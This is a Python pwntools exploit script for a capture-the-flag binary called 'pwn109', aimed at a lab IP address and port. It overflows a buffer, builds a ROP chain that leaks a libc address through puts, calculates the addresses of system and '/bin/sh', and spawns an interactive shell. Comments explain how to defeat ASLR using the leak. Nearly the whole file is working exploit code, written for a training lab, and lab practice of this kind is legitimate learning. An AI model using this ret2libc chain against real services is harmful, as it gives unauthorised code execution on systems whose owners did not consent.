from pwn import *

IP = "10.10.225.15"

PORT = 9009

#context.log_level = 'DEBUG'

io = remote(IP, PORT)

#io = process("./pwn109-1644300507645.pwn109")

#gdb.attach(io, gdbscript='b *main+63')

elf = ELF("pwn109-1644300507645.pwn109", checksec=False)

print(io.recv().decode('latin-1'))

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']

setvbuf_got = elf.got['setvbuf']

gets_got = elf.got['gets']

main_addr = elf.functions.main.address

pop_rdi = 0x00000000004012a3

ret = 0x000000000040101a

# return address is overwritten after 40-bytes of padding
# RBP hit at 32byte mark

payload = b'A' * 40

payload += p64(ret) + p64(pop_rdi) + p64(gets_got) + p64(puts_plt) + p64(main_addr)

io.sendline(payload)

print(io.recv().decode('latin-1'))

gets_libc = u64(io.recv().split(b'\n')[0].ljust(8, b'\x00'))

#			""" Key takeaways """
# Even if ASLR is enabled, given a leak from a DLL, it is possible to cacluate the offset
# of other functions in the same library using the last 3 nibbles of the leaked function.
# The address of system, and the "/bin/sh" string in libc was calculated based on a leaked 
# gets function's resolved address in libc. Note that there are several tools available to 
# calculate offsets
# https://libc.blukat.me/?q=gets%3A190%2Csetvbuf%3A3d0&l=libc6_2.27-3ubuntu1.4_amd64
# the above tool was used for the lab.

log.info(f"Resolved addresss of gets in libc: {hex(gets_libc)}")

system = gets_libc - 0x30c40

bin_sh = gets_libc + 0x133c8a

io.sendline(b'A'* 40 + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(main_addr))

io.interactive()
